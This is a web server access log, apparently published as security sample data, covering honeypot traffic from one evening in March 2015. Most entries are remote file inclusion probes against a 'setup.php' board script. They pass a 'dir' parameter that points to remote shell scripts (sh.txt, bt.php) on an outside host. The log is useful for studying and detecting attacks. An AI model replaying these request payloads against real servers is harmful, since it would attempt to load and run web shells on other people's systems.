113.228.135.84 - - [30/Mar/2015:20:51:39 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4" 
212.45.53.80 - - [30/Mar/2015:20:53:19 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:53:20 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:53:20 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:53:21 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:53:21 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:53:23 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:53:23 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:53:24 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
208.115.113.94 - - [30/Mar/2015:21:07:30 -0700] "GET /robots.txt HTTP/1.1" 301 462 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
208.115.113.94 - - [30/Mar/2015:21:07:30 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
181.65.186.35 - - [30/Mar/2015:21:23:24 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.50 Safari/537.36" 
